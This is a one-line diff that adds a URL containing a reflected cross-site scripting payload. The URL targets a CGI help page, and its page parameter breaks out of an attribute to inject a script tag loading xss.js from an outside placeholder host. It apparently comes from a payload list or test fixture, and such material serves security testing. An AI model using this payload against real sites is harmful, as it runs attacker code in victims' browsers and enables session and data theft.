@@ -1,0 +1,1 @@
+http://example.net/cgi-bin/cgix/help?&amp;page=web_list_block“&gt;&lt;script src=“http://example.com/xss.js”&gt;&lt;/script&gt;
